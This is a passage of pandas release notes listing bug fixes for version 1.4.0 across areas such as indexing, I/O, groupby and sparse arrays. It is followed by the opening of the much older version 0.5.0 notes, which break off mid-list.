as fill value) (:issue:`42921`)\n- Bug in :class:`DateOffset` addition with :class:`Timestamp` where ``offset.nanoseconds`` would not be included in the result (:issue:`43968`, :issue:`36589`)\n- Bug in :meth:`Timestamp.fromtimestamp` not supporting the ``tz`` argument (:issue:`45083`)\n- Bug in :class:`DataFrame` construction from dict of :class:`Series` with mismatched index dtypes sometimes raising depending on the ordering of the passed dict (:issue:`44091`)\n- Bug in :class:`Timestamp` hashing during some DST transitions caused a segmentation fault (:issue:`33931` and :issue:`40817`)\n\nTimedelta\n^^^^^^^^^\n- Bug in division of all-``NaT`` :class:`TimeDeltaIndex`, :class:`Series` or :class:`DataFrame` column with object-dtype array like of numbers failing to infer the result as timedelta64-dtype (:issue:`39750`)\n- Bug in floor division of ``timedelta64[ns]`` data with a scalar returning garbage values (:issue:`44466`)\n- Bug in :class:`Timedelta` now properly taking into account any nanoseconds contribution of any kwarg (:issue:`43764`, :issue:`45227`)\n\nTime Zones\n^^^^^^^^^^\n- Bug in :func:`to_datetime` with ``infer_datetime_format=True`` failing to parse zero UTC offset (``Z``) correctly (:issue:`41047`)\n- Bug in :meth:`Series.dt.tz_convert` resetting index in a :class:`Series` with :class:`CategoricalIndex` (:issue:`43080`)\n- Bug in ``Timestamp`` and ``DatetimeIndex`` incorrectly raising a ``TypeError`` when subtracting two timezone-aware objects with mismatched timezones (:issue:`31793`)\n\nNumeric\n^^^^^^^\n- Bug in floor-dividing a list or tuple of integers by a :class:`Series` incorrectly raising (:issue:`44674`)\n- Bug in :meth:`DataFrame.rank` raising ``ValueError`` with ``object`` columns and ``method=\"first\"`` (:issue:`41931`)\n- Bug in :meth:`DataFrame.rank` treating missing values and extreme values as equal (for example ``np.nan`` and ``np.inf``), causing incorrect results when ``na_option=\"bottom\"`` or ``na_option=\"top`` used (:issue:`41931`)\n- Bug in ``numexpr`` engine still being used when the option ``compute.use_numexpr`` is set to ``False`` (:issue:`32556`)\n- Bug in :class:`DataFrame` arithmetic ops with a subclass whose :meth:`_constructor` attribute is a callable other than the subclass itself (:issue:`43201`)\n- Bug in arithmetic operations involving :class:`RangeIndex` where the result would have the incorrect ``name`` (:issue:`43962`)\n- Bug in arithmetic operations involving :class:`Series` where the result could have the incorrect ``name`` when the operands having matching NA or matching tuple names (:issue:`44459`)\n- Bug in division with ``IntegerDtype`` or ``BooleanDtype`` array and NA scalar incorrectly raising (:issue:`44685`)\n- Bug in multiplying a :class:`Series` with ``FloatingDtype`` with a timedelta-like scalar incorrectly raising (:issue:`44772`)\n\nConversion\n^^^^^^^^^^\n- Bug in :class:`UInt64Index` constructor when passing a list containing both positive integers small enough to cast to int64 and integers too large to hold in int64 (:issue:`42201`)\n- Bug in :class:`Series` constructor returning 0 for missing values with dtype ``int64`` and ``False`` for dtype ``bool`` (:issue:`43017`, :issue:`43018`)\n- Bug in constructing a :class:`DataFrame` from a :class:`PandasArray` containing :class:`Series` objects behaving differently than an equivalent ``np.ndarray`` (:issue:`43986`)\n- Bug in :class:`IntegerDtype` not allowing coercion from string dtype (:issue:`25472`)\n- Bug in :func:`to_datetime` with ``arg:xr.DataArray`` and ``unit=\"ns\"`` specified raises ``TypeError`` (:issue:`44053`)\n- Bug in :meth:`DataFrame.convert_dtypes` not returning the correct type when a subclass does not overload :meth:`_constructor_sliced` (:issue:`43201`)\n- Bug in :meth:`DataFrame.astype` not propagating ``attrs`` from the original :class:`DataFrame` (:issue:`44414`)\n- Bug in :meth:`DataFrame.convert_dtypes` result losing ``columns.names`` (:issue:`41435`)\n- Bug in constructing a ``IntegerArray`` from pyarrow data failing to validate dtypes (:issue:`44891`)\n- Bug in :meth:`Series.astype` not allowing converting from a ``PeriodDtype`` to ``datetime64`` dtype, inconsistent with the :class:`PeriodIndex` behavior (:issue:`45038`)\n\nStrings\n^^^^^^^\n- Bug in checking for ``string[pyarrow]`` dtype incorrectly raising an ``ImportError`` when pyarrow is not installed (:issue:`44276`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`Series.where` with ``IntervalDtype`` incorrectly raising when the ``where`` call should not replace anything (:issue:`44181`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`Series.rename` with :class:`MultiIndex` and ``level`` is provided (:issue:`43659`)\n- Bug in :meth:`DataFrame.truncate` and :meth:`Series.truncate` when the object's :class:`Index` has a length greater than one but only one unique value (:issue:`42365`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` with a :class:`MultiIndex` when indexing with a tuple in which one of the levels is also a tuple (:issue:`27591`)\n- Bug in :meth:`Series.loc` with a :class:`MultiIndex` whose first level contains only ``np.nan`` values (:issue:`42055`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`DatetimeIndex` when passing a string, the return type depended on whether the index was monotonic (:issue:`24892`)\n- Bug in indexing on a :class:`MultiIndex` failing to drop scalar levels when the indexer is a tuple containing a datetime-like string (:issue:`42476`)\n- Bug in :meth:`DataFrame.sort_values` and :meth:`Series.sort_values` when passing an ascending value, failed to raise or incorrectly raising ``ValueError`` (:issue:`41634`)\n- Bug in updating values of :class:`pandas.Series` using boolean index, created by using :meth:`pandas.DataFrame.pop` (:issue:`42530`)\n- Bug in :meth:`Index.get_indexer_non_unique` when index contains multiple ``np.nan`` (:issue:`35392`)\n- Bug in :meth:`DataFrame.query` did not handle the degree sign in a backticked column name, such as \\`Temp(\u00c2\u00b0C)\\`, used in an expression to query a :class:`DataFrame` (:issue:`42826`)\n- Bug in :meth:`DataFrame.drop` where the error message did not show missing labels with commas when raising ``KeyError`` (:issue:`42881`)\n- Bug in :meth:`DataFrame.query` where method calls in query strings led to errors when the ``numexpr`` package was installed (:issue:`22435`)\n- Bug in :meth:`DataFrame.nlargest` and :meth:`Series.nlargest` where sorted result did not count indexes containing ``np.nan`` (:issue:`28984`)\n- Bug in indexing on a non-unique object-dtype :class:`Index` with an NA scalar (e.g. ``np.nan``) (:issue:`43711`)\n- Bug in :meth:`DataFrame.__setitem__` incorrectly writing into an existing column's array rather than setting a new array when the new dtype and the old dtype match (:issue:`43406`)\n- Bug in setting floating-dtype values into a :class:`Series` with integer dtype failing to set inplace when those values can be losslessly converted to integers (:issue:`44316`)\n- Bug in :meth:`Series.__setitem__` with object dtype when setting an array with matching size and dtype='datetime64[ns]' or dtype='timedelta64[ns]' incorrectly converting the datetime/timedeltas to integers (:issue:`43868`)\n- Bug in :meth:`DataFrame.sort_index` where ``ignore_index=True`` was not being respected when the index was already sorted (:issue:`43591`)\n- Bug in :meth:`Index.get_indexer_non_unique` when index contains multiple ``np.datetime64(\"NaT\")`` and ``np.timedelta64(\"NaT\")`` (:issue:`43869`)\n- Bug in setting a scalar :class:`Interval` value into a :class:`Series` with ``IntervalDtype`` when the scalar's sides are floats and the values' sides are integers (:issue:`44201`)\n- Bug when setting string-backed :class:`Categorical` values that can be parsed to datetimes into a :class:`DatetimeArray` or :class:`Series` or :class:`DataFrame` column backed by :class:`DatetimeArray` failing to parse these strings (:issue:`44236`)\n- Bug in :meth:`Series.__setitem__` with an integer dtype other than ``int64`` setting with a ``range`` object unnecessarily upcasting to ``int64`` (:issue:`44261`)\n- Bug in :meth:`Series.__setitem__` with a boolean mask indexer setting a listlike value of length 1 incorrectly broadcasting that value (:issue:`44265`)\n- Bug in :meth:`Series.reset_index` not ignoring ``name`` argument when ``drop`` and ``inplace`` are set to ``True`` (:issue:`44575`)\n- Bug in :meth:`DataFrame.loc.__setitem__` and :meth:`DataFrame.iloc.__setitem__` with mixed dtypes sometimes failing to operate in-place (:issue:`44345`)\n- Bug in :meth:`DataFrame.loc.__getitem__` incorrectly raising ``KeyError`` when selecting a single column with a boolean key (:issue:`44322`).\n- Bug in setting :meth:`DataFrame.iloc` with a single ``ExtensionDtype`` column and setting 2D values e.g. ``df.iloc[:] = df.values`` incorrectly raising (:issue:`44514`)\n- Bug in setting values with :meth:`DataFrame.iloc` with a single ``ExtensionDtype`` column and a tuple of arrays as the indexer (:issue:`44703`)\n- Bug in indexing on columns with ``loc`` or ``iloc`` using a slice with a negative step with ``ExtensionDtype`` columns incorrectly raising (:issue:`44551`)\n- Bug in :meth:`DataFrame.loc.__setitem__` changing dtype when indexer was completely ``False`` (:issue:`37550`)\n- Bug in :meth:`IntervalIndex.get_indexer_non_unique` returning boolean mask instead of array of integers for a non unique and non monotonic index (:issue:`44084`)\n- Bug in :meth:`IntervalIndex.get_indexer_non_unique` not handling targets of ``dtype`` 'object' with NaNs correctly (:issue:`44482`)\n- Fixed regression where a single column ``np.matrix`` was no longer coerced to a 1d ``np.ndarray`` when added to a :class:`DataFrame` (:issue:`42376`)\n- Bug in :meth:`Series.__getitem__` with a :class:`CategoricalIndex` of integers treating lists of integers as positional indexers, inconsistent with the behavior with a single scalar integer (:issue:`15470`, :issue:`14865`)\n- Bug in :meth:`Series.__setitem__` when setting floats or integers into integer-dtype :class:`Series` failing to upcast when necessary to retain precision (:issue:`45121`)\n- Bug in :meth:`DataFrame.iloc.__setitem__` ignores axis argument (:issue:`45032`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`DataFrame.fillna` with ``limit`` and no ``method`` ignores ``axis='columns'`` or ``axis = 1`` (:issue:`40989`, :issue:`17399`)\n- Bug in :meth:`DataFrame.fillna` not replacing missing values when using a dict-like ``value`` and duplicate column names (:issue:`43476`)\n- Bug in constructing a :class:`DataFrame` with a dictionary ``np.datetime64`` as a value and ``dtype='timedelta64[ns]'``, or vice-versa, incorrectly casting instead of raising (:issue:`44428`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` with ``inplace=True`` not writing to the underlying array(s) in-place (:issue:`44749`)\n- Bug in :meth:`Index.fillna` incorrectly returning an unfilled :class:`Index` when NA values are present and ``downcast`` argument is specified. This now raises ``NotImplementedError`` instead; do not pass ``downcast`` argument (:issue:`44873`)\n- Bug in :meth:`DataFrame.dropna` changing :class:`Index` even if no entries were dropped (:issue:`41965`)\n- Bug in :meth:`Series.fillna` with an object-dtype incorrectly ignoring ``downcast=\"infer\"`` (:issue:`44241`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_loc` where the first level is a :class:`DatetimeIndex` and a string key is passed (:issue:`42465`)\n- Bug in :meth:`MultiIndex.reindex` when passing a ``level`` that corresponds to an ``ExtensionDtype`` level (:issue:`42043`)\n- Bug in :meth:`MultiIndex.get_loc` raising ``TypeError`` instead of ``KeyError`` on nested tuple (:issue:`42440`)\n- Bug in :meth:`MultiIndex.union` setting wrong ``sortorder`` causing errors in subsequent indexing operations with slices (:issue:`44752`)\n- Bug in :meth:`MultiIndex.putmask` where the other value was also a :class:`MultiIndex` (:issue:`43212`)\n- Bug in :meth:`MultiIndex.dtypes` duplicate level names returned only one dtype per name (:issue:`45174`)\n\nI/O\n^^^\n- Bug in :func:`read_excel` attempting to read chart sheets from .xlsx files (:issue:`41448`)\n- Bug in :func:`json_normalize` where ``errors=ignore`` could fail to ignore missing values of ``meta`` when ``record_path`` has a length greater than one (:issue:`41876`)\n- Bug in :func:`read_csv` with multi-header input and arguments referencing column names as tuples (:issue:`42446`)\n- Bug in :func:`read_fwf`, where difference in lengths of ``colspecs`` and ``names`` was not raising ``ValueError`` (:issue:`40830`)\n- Bug in :func:`Series.to_json` and :func:`DataFrame.to_json` where some attributes were skipped when serializing plain Python objects to JSON (:issue:`42768`, :issue:`33043`)\n- Column headers are dropped when constructing a :class:`DataFrame` from a sqlalchemy's ``Row`` object (:issue:`40682`)\n- Bug in unpickling an :class:`Index` with object dtype incorrectly inferring numeric dtypes (:issue:`43188`)\n- Bug in :func:`read_csv` where reading multi-header input with unequal lengths incorrectly raised ``IndexError`` (:issue:`43102`)\n- Bug in :func:`read_csv` raising ``ParserError`` when reading file in chunks and some chunk blocks have fewer columns than header for ``engine=\"c\"`` (:issue:`21211`)\n- Bug in :func:`read_csv`, changed exception class when expecting a file path name or file-like object from ``OSError`` to ``TypeError`` (:issue:`43366`)\n- Bug in :func:`read_csv` and :func:`read_fwf` ignoring all ``skiprows`` except first when ``nrows`` is specified for ``engine='python'`` (:issue:`44021`, :issue:`10261`)\n- Bug in :func:`read_csv` keeping the original column in object format when ``keep_date_col=True`` is set (:issue:`13378`)\n- Bug in :func:`read_json` not handling non-numpy dtypes correctly (especially ``category``) (:issue:`21892`, :issue:`33205`)\n- Bug in :func:`json_normalize` where multi-character ``sep`` parameter is incorrectly prefixed to every key (:issue:`43831`)\n- Bug in :func:`json_normalize` where reading data with missing multi-level metadata would not respect ``errors=\"ignore\"`` (:issue:`44312`)\n- Bug in :func:`read_csv` used second row to guess implicit index if ``header`` was set to ``None`` for ``engine=\"python\"`` (:issue:`22144`)\n- Bug in :func:`read_csv` not recognizing bad lines when ``names`` were given for ``engine=\"c\"`` (:issue:`22144`)\n- Bug in :func:`read_csv` with :code:`float_precision=\"round_trip\"` which did not skip initial/trailing whitespace (:issue:`43713`)\n- Bug when Python is built without the lzma module: a warning was raised at the pandas import time, even if the lzma capability isn't used (:issue:`43495`)\n- Bug in :func:`read_csv` not applying dtype for ``index_col`` (:issue:`9435`)\n- Bug in dumping/loading a :class:`DataFrame` with ``yaml.dump(frame)`` (:issue:`42748`)\n- Bug in :func:`read_csv` raising ``ValueError`` when ``names`` was longer than ``header`` but equal to data rows for ``engine=\"python\"`` (:issue:`38453`)\n- Bug in :class:`ExcelWriter`, where ``engine_kwargs`` were not passed through to all engines (:issue:`43442`)\n- Bug in :func:`read_csv` raising ``ValueError`` when ``parse_dates`` was used with :class:`MultiIndex` columns (:issue:`8991`)\n- Bug in :func:`read_csv` not raising an ``ValueError`` when ``\\n`` was specified as ``delimiter`` or ``sep`` which conflicts with ``lineterminator`` (:issue:`43528`)\n- Bug in :func:`to_csv` converting datetimes in categorical :class:`Series` to integers (:issue:`40754`)\n- Bug in :func:`read_csv` converting columns to numeric after date parsing failed (:issue:`11019`)\n- Bug in :func:`read_csv` not replacing ``NaN`` values with ``np.nan`` before attempting date conversion (:issue:`26203`)\n- Bug in :func:`read_csv` raising ``AttributeError`` when attempting to read a .csv file and infer index column dtype from an nullable integer type (:issue:`44079`)\n- Bug in :func:`to_csv` always coercing datetime columns with different formats to the same format (:issue:`21734`)\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` with ``compression`` set to ``'zip'`` no longer create a zip file containing a file ending with \".zip\". Instead, they try to infer the inner file name more smartly (:issue:`39465`)\n- Bug in :func:`read_csv` where reading a mixed column of booleans and missing values to a float type results in the missing values becoming 1.0 rather than NaN (:issue:`42808`, :issue:`34120`)\n- Bug in :func:`to_xml` raising error for ``pd.NA`` with extension array dtype (:issue:`43903`)\n- Bug in :func:`read_csv` when passing simultaneously a parser in ``date_parser`` and ``parse_dates=False``, the parsing was still called (:issue:`44366`)\n- Bug in :func:`read_csv` not setting name of :class:`MultiIndex` columns correctly when ``index_col`` is not the first column (:issue:`38549`)\n- Bug in :func:`read_csv` silently ignoring errors when failing to create a memory-mapped file (:issue:`44766`)\n- Bug in :func:`read_csv` when passing a ``tempfile.SpooledTemporaryFile`` opened in binary mode (:issue:`44748`)\n- Bug in :func:`read_json` raising ``ValueError`` when attempting to parse json strings containing \"://\" (:issue:`36271`)\n- Bug in :func:`read_csv` when ``engine=\"c\"`` and ``encoding_errors=None`` which caused a segfault (:issue:`45180`)\n- Bug in :func:`read_csv` an invalid value of ``usecols`` leading to an unclosed file handle (:issue:`45384`)\n- Bug in :meth:`DataFrame.to_json` fix memory leak (:issue:`43877`)\n\nPeriod\n^^^^^^\n- Bug in adding a :class:`Period` object to a ``np.timedelta64`` object incorrectly raising ``TypeError`` (:issue:`44182`)\n- Bug in :meth:`PeriodIndex.to_timestamp` when the index has ``freq=\"B\"`` inferring ``freq=\"D\"`` for its result instead of ``freq=\"B\"`` (:issue:`44105`)\n- Bug in :class:`Period` constructor incorrectly allowing ``np.timedelta64(\"NaT\")`` (:issue:`44507`)\n- Bug in :meth:`PeriodIndex.to_timestamp` giving incorrect values for indexes with non-contiguous data (:issue:`44100`)\n- Bug in :meth:`Series.where` with ``PeriodDtype`` incorrectly raising when the ``where`` call should not replace anything (:issue:`45135`)\n\nPlotting\n^^^^^^^^\n- When given non-numeric data, :meth:`DataFrame.boxplot` now raises a ``ValueError`` rather than a cryptic ``KeyError`` or ``ZeroDivisionError``, in line with other plotting functions like :meth:`DataFrame.hist` (:issue:`43480`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`SeriesGroupBy.apply` where passing an unrecognized string argument failed to raise ``TypeError`` when the underlying ``Series`` is empty (:issue:`42021`)\n- Bug in :meth:`Series.rolling.apply`, :meth:`DataFrame.rolling.apply`, :meth:`Series.expanding.apply` and :meth:`DataFrame.expanding.apply` with ``engine=\"numba\"`` where ``*args`` were being cached with the user passed function (:issue:`42287`)\n- Bug in :meth:`.DataFrameGroupBy.max`, :meth:`.SeriesGroupBy.max`, :meth:`.DataFrameGroupBy.min`, and :meth:`.SeriesGroupBy.min` with nullable integer dtypes losing precision (:issue:`41743`)\n- Bug in :meth:`DataFrame.groupby.rolling.var` would calculate the rolling variance only on the first group (:issue:`42442`)\n- Bug in :meth:`.DataFrameGroupBy.shift` and :meth:`.SeriesGroupBy.shift` that would return the grouping columns if ``fill_value`` was not ``None`` (:issue:`41556`)\n- Bug in :meth:`SeriesGroupBy.nlargest` and :meth:`SeriesGroupBy.nsmallest` would have an inconsistent index when the input :class:`Series` was sorted and ``n`` was greater than or equal to all group sizes (:issue:`15272`, :issue:`16345`, :issue:`29129`)\n- Bug in :meth:`pandas.DataFrame.ewm`, where non-float64 dtypes were silently failing (:issue:`42452`)\n- Bug in :meth:`pandas.DataFrame.rolling` operation along rows (``axis=1``) incorrectly omits columns containing ``float16`` and ``float32`` (:issue:`41779`)\n- Bug in :meth:`Resampler.aggregate` did not allow the use of Named Aggregation (:issue:`32803`)\n- Bug in :meth:`Series.rolling` when the :class:`Series` ``dtype`` was ``Int64`` (:issue:`43016`)\n- Bug in :meth:`DataFrame.rolling.corr` when the :class:`DataFrame` columns was a :class:`MultiIndex` (:issue:`21157`)\n- Bug in :meth:`DataFrame.groupby.rolling` when specifying ``on`` and calling ``__getitem__`` would subsequently return incorrect results (:issue:`43355`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` with time-based :class:`Grouper` objects incorrectly raising ``ValueError`` in corner cases where the grouping vector contains a ``NaT`` (:issue:`43500`, :issue:`43515`)\n- Bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` failing with ``complex`` dtype (:issue:`43701`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not calculating window bounds correctly for the first row when ``center=True`` and index is decreasing (:issue:`43927`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` for centered datetimelike windows with uneven nanosecond (:issue:`43997`)\n- Bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` raising ``KeyError`` when column was selected at least twice (:issue:`44924`)\n- Bug in :meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` failing on ``axis=1`` (:issue:`43926`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not respecting right bound on centered datetime-like windows, if the index contain duplicates (:issue:`3944`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` when using a :class:`pandas.api.indexers.BaseIndexer` subclass that returned unequal start and end arrays would segfault instead of raising a ``ValueError`` (:issue:`44470`)\n- Bug in :meth:`Groupby.nunique` not respecting ``observed=True`` for ``categorical`` grouping columns (:issue:`45128`)\n- Bug in :meth:`.DataFrameGroupBy.head`, :meth:`.SeriesGroupBy.head`, :meth:`.DataFrameGroupBy.tail`, and :meth:`.SeriesGroupBy.tail` not dropping groups with ``NaN`` when ``dropna=True`` (:issue:`45089`)\n- Bug in :meth:`GroupBy.__iter__` after selecting a subset of columns in a :class:`GroupBy` object, which returned all columns instead of the chosen subset (:issue:`44821`)\n- Bug in :meth:`Groupby.rolling` when non-monotonic data passed, fails to correctly raise ``ValueError`` (:issue:`43909`)\n- Bug where grouping by a :class:`Series` that has a ``categorical`` data type and length unequal to the axis of grouping raised ``ValueError`` (:issue:`44179`)\n\nReshaping\n^^^^^^^^^\n- Improved error message when creating a :class:`DataFrame` column from a multi-dimensional :class:`numpy.ndarray` (:issue:`42463`)\n- Bug in :func:`concat` creating :class:`MultiIndex` with duplicate level entries when concatenating a :class:`DataFrame` with duplicates in :class:`Index` and multiple keys (:issue:`42651`)\n- Bug in :meth:`pandas.cut` on :class:`Series` with duplicate indices and non-exact :meth:`pandas.CategoricalIndex` (:issue:`42185`, :issue:`42425`)\n- Bug in :meth:`DataFrame.append` failing to retain dtypes when appended columns do not match (:issue:`43392`)\n- Bug in :func:`concat` of ``bool`` and ``boolean`` dtypes resulting in ``object`` dtype instead of ``boolean`` dtype (:issue:`42800`)\n- Bug in :func:`crosstab` when inputs are categorical :class:`Series`, there are categories that are not present in one or both of the :class:`Series`, and ``margins=True``. Previously the margin value for missing categories was ``NaN``. It is now correctly reported as 0 (:issue:`43505`)\n- Bug in :func:`concat` would fail when the ``objs`` argument all had the same index and the ``keys`` argument contained duplicates (:issue:`43595`)\n- Bug in :func:`concat` which ignored the ``sort`` parameter (:issue:`43375`)\n- Bug in :func:`merge` with :class:`MultiIndex` as column index for the ``on`` argument returning an error when assigning a column internally (:issue:`43734`)\n- Bug in :func:`crosstab` would fail when inputs are lists or tuples (:issue:`44076`)\n- Bug in :meth:`DataFrame.append` failing to retain ``index.name`` when appending a list of :class:`Series` objects (:issue:`44109`)\n- Fixed metadata propagation in :meth:`Dataframe.apply` method, consequently fixing the same issue for :meth:`Dataframe.transform`, :meth:`Dataframe.nunique` and :meth:`Dataframe.mode` (:issue:`28283`)\n- Bug in :func:`concat` casting levels of :class:`MultiIndex` to float if all levels only consist of missing values (:issue:`44900`)\n- Bug in :meth:`DataFrame.stack` with ``ExtensionDtype`` columns incorrectly raising (:issue:`43561`)\n- Bug in :func:`merge` raising ``KeyError`` when joining over differently named indexes with on keywords (:issue:`45094`)\n- Bug in :meth:`Series.unstack` with object doing unwanted type inference on resulting columns (:issue:`44595`)\n- Bug in :meth:`MultiIndex.join()` with overlapping ``IntervalIndex`` levels (:issue:`44096`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` results is different ``dtype`` based on ``regex`` parameter (:issue:`44864`)\n- Bug in :meth:`DataFrame.pivot` with ``index=None`` when the :class:`DataFrame` index was a :class:`MultiIndex` (:issue:`23955`)\n\nSparse\n^^^^^^\n- Bug in :meth:`DataFrame.sparse.to_coo` raising ``AttributeError`` when column names are not unique (:issue:`29564`)\n- Bug in :meth:`SparseArray.max` and :meth:`SparseArray.min` raising ``ValueError`` for arrays with 0 non-null elements (:issue:`43527`)\n- Bug in :meth:`DataFrame.sparse.to_coo` silently converting non-zero fill values to zero (:issue:`24817`)\n- Bug in :class:`SparseArray` comparison methods with an array-like operand of mismatched length raising ``AssertionError`` or unclear ``ValueError`` depending on the input (:issue:`43863`)\n- Bug in :class:`SparseArray` arithmetic methods ``floordiv`` and ``mod`` behaviors when dividing by zero not matching the non-sparse :class:`Series` behavior (:issue:`38172`)\n- Bug in :class:`SparseArray` unary methods as well as :meth:`SparseArray.isna` doesn't recalculate indexes (:issue:`44955`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :func:`array` failing to preserve :class:`PandasArray` (:issue:`43887`)\n- NumPy ufuncs ``np.abs``, ``np.positive``, ``np.negative`` now correctly preserve dtype when called on ExtensionArrays that implement ``__abs__, __pos__, __neg__``, respectively. In particular this is fixed for :class:`TimedeltaArray` (:issue:`43899`, :issue:`23316`)\n- NumPy ufuncs ``np.minimum.reduce`` ``np.maximum.reduce``, ``np.add.reduce``, and ``np.prod.reduce`` now work correctly instead of raising ``NotImplementedError`` on :class:`Series` with ``IntegerDtype`` or ``FloatDtype`` (:issue:`43923`, :issue:`44793`)\n- NumPy ufuncs with ``out`` keyword are now supported by arrays with ``IntegerDtype`` and ``FloatingDtype`` (:issue:`45122`)\n- Avoid raising ``PerformanceWarning`` about fragmented :class:`DataFrame` when using many columns with an extension dtype (:issue:`44098`)\n- Bug in :class:`IntegerArray` and :class:`FloatingArray` construction incorrectly coercing mismatched NA values (e.g. ``np.timedelta64(\"NaT\")``) to numeric NA (:issue:`44514`)\n- Bug in :meth:`BooleanArray.__eq__` and :meth:`BooleanArray.__ne__` raising ``TypeError`` on comparison with an incompatible type (like a string). This caused :meth:`DataFrame.replace` to sometimes raise a ``TypeError`` if a nullable boolean column was included (:issue:`44499`)\n- Bug in :func:`array` incorrectly raising when passed a ``ndarray`` with ``float16`` dtype (:issue:`44715`)\n- Bug in calling ``np.sqrt`` on :class:`BooleanArray` returning a malformed :class:`FloatingArray` (:issue:`44715`)\n- Bug in :meth:`Series.where` with ``ExtensionDtype`` when ``other`` is a NA scalar incompatible with the :class:`Series` dtype (e.g. ``NaT`` with a numeric dtype) incorrectly casting to a compatible NA value (:issue:`44697`)\n- Bug in :meth:`Series.replace` where explicitly passing ``value=None`` is treated as if no ``value`` was passed, and ``None`` not being in the result (:issue:`36984`, :issue:`19998`)\n- Bug in :meth:`Series.replace` with unwanted downcasting being done in no-op replacements (:issue:`44498`)\n- Bug in :meth:`Series.replace` with ``FloatDtype``, ``string[python]``, or ``string[pyarrow]`` dtype not being preserved when possible (:issue:`33484`, :issue:`40732`, :issue:`31644`, :issue:`41215`, :issue:`25438`)\n\nStyler\n^^^^^^\n- Bug in :class:`.Styler` where the ``uuid`` at initialization maintained a floating underscore (:issue:`43037`)\n- Bug in :meth:`.Styler.to_html` where the ``Styler`` object was updated if the ``to_html`` method was called with some args (:issue:`43034`)\n- Bug in :meth:`.Styler.copy` where ``uuid`` was not previously copied (:issue:`40675`)\n- Bug in :meth:`Styler.apply` where functions which returned :class:`Series` objects were not correctly handled in terms of aligning their index labels (:issue:`13657`, :issue:`42014`)\n- Bug when rendering an empty :class:`DataFrame` with a named :class:`Index` (:issue:`43305`)\n- Bug when rendering a single level :class:`MultiIndex` (:issue:`43383`)\n- Bug when combining non-sparse rendering and :meth:`.Styler.hide_columns` or :meth:`.Styler.hide_index` (:issue:`43464`)\n- Bug setting a table style when using multiple selectors in :class:`.Styler` (:issue:`44011`)\n- Bugs where row trimming and column trimming failed to reflect hidden rows (:issue:`43703`, :issue:`44247`)\n\nOther\n^^^^^\n- Bug in :meth:`DataFrame.astype` with non-unique columns and a :class:`Series` ``dtype`` argument (:issue:`44417`)\n- Bug in :meth:`CustomBusinessMonthBegin.__add__` (:meth:`CustomBusinessMonthEnd.__add__`) not applying the extra ``offset`` parameter when beginning (end) of the target month is already a business day (:issue:`41356`)\n- Bug in :meth:`RangeIndex.union` with another ``RangeIndex`` with matching (even) ``step`` and starts differing by strictly less than ``step / 2`` (:issue:`44019`)\n- Bug in :meth:`RangeIndex.difference` with ``sort=None`` and ``step<0`` failing to sort (:issue:`44085`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` with ``value=None`` and ExtensionDtypes (:issue:`44270`, :issue:`37899`)\n- Bug in :meth:`FloatingArray.equals` failing to consider two arrays equal if they contain ``np.nan`` values (:issue:`44382`)\n- Bug in :meth:`DataFrame.shift` with ``axis=1`` and ``ExtensionDtype`` columns incorrectly raising when an incompatible ``fill_value`` is passed (:issue:`44564`)\n- Bug in :meth:`DataFrame.shift` with ``axis=1`` and ``periods`` larger than ``len(frame.columns)`` producing an invalid :class:`DataFrame` (:issue:`44978`)\n- Bug in :meth:`DataFrame.diff` when passing a NumPy integer object instead of an ``int`` object (:issue:`44572`)\n- Bug in :meth:`Series.replace` raising ``ValueError`` when using ``regex=True`` with a :class:`Series` containing ``np.nan`` values (:issue:`43344`)\n- Bug in :meth:`DataFrame.to_records` where an incorrect ``n`` was used when missing names were replaced by ``level_n`` (:issue:`44818`)\n- Bug in :meth:`DataFrame.eval` where ``resolvers`` argument was overriding the default resolvers (:issue:`34966`)\n- :meth:`Series.__repr__` and :meth:`DataFrame.__repr__` no longer replace all null-values in indexes with \"NaN\" but use their real string-representations. \"NaN\" is used only for ``float(\"nan\")`` (:issue:`45263`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.5..v1.4.0\n\n\n\n.. _whatsnew_050:\n\nVersion 0.5.0 (October 24, 2011)\n--------------------------------\n\n{{ header }}\n\nNew features\n~~~~~~~~~~~~\n\n- :ref:`Added <basics.df_join>` ``DataFrame.align`` method with standard join options\n- :ref:`Added <io.parse_dates>` ``parse_dates`` option to ``read_csv`` and ``read_table`` methods to optionally try to parse dates in the index columns\n- :ref:`Added <io.parse_dates>` ``nrows``, ``chunksize``, and ``iterator`` arguments to ``read_csv`` and ``read_table``. The last two return a new ``TextParser`` class capable of lazily iterating through chunks of a flat file (:issue:`242`)\n- :ref:`Added <merging.multikey_join>` ability to join on multiple columns in ``DataFrame.join`` (:issue:`214`)\n- Added private ``_get_duplicates`` function to ``Index`` for identifying duplicate values more easily (ENH5c_)\n- :ref:`Added <indexing.df_cols>` column attribute access to DataFrame.\n- :ref:`Added <indexing.df_cols>` Python tab completion hook for DataFrame columns. (:issue:`233`, :issue:`230`)\n- :ref:`Implemented <basics.describe>` ``Series.describe`` for Series containing objects (:issue:`241`)\n- :ref:`Added <merging.df_inner_join>` inner join option to ``DataFrame.join`` when joining on key(s) (:issue:`248`)\n- :ref:`Implemented <indexing.df_cols>` selecting DataFrame columns by passing a list to ``__getitem__`` (:issue:`253`)\n- 